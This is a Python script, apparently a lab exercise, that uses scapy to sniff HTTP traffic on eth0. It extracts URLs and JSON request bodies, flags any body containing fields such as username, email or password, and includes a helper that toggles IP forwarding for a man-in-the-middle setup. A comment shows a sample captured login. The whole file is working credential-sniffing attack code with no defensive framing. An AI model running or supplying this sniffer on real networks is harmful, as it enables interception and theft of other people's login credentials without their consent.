import scapy.all as scapy
from scapy.layers import http
import sqlite3
import json

def sniff(interface) : 

    print(interface)
    scapy.sniff(iface=interface,store=False,prn=processing_packets)

def portforward(val):
    with open("/proc/sys/net/ipv4/ip_forward","w") as file : 
        file.write(str(val))

def processing_packets(packet):
    # the packet is the whole packet with payload and all 7 headers, the payload is inside Raw
    # print("we here")
    if packet.haslayer("HTTPRequest"):
        # portforward(0)
        # here we specifying the data inside the http Request that will be the http own data (header) and our payload
        # httpRequest header | Raw : payload
        url = packet["HTTPRequest"].Host + packet["HTTPRequest"].Path
        print(url)
        #z3ma wach 3ndha Raw field
        # print(scapy.Raw)
        if packet.haslayer("Raw") :
            print(packet.show())
            
            try : 
                #payload = {"email":"formateur@sen.netmobo.lab","username":"","password":"123456","profileImg":""}'

                payload_object = json.loads(packet["HTTPRequest"]["Raw"].load.decode())
                keywords = ["username","name","email","user","password"]
                for keyword in keywords : 
                    if keyword in payload_object :
                        print(payload_object)
                        
                        break
                    else : 
                        continue
            except : 
                print("an error happend")
    # else :
    #     portforward(1)
                    
# def processing_packets(packet):
    
#     if packet.haslayer("HTTPRequest") : 
#         http_header = packet["HTTPRequest"]
#         link = http_header.Host + http_header.Path
        
    pass

sniff("eth0")

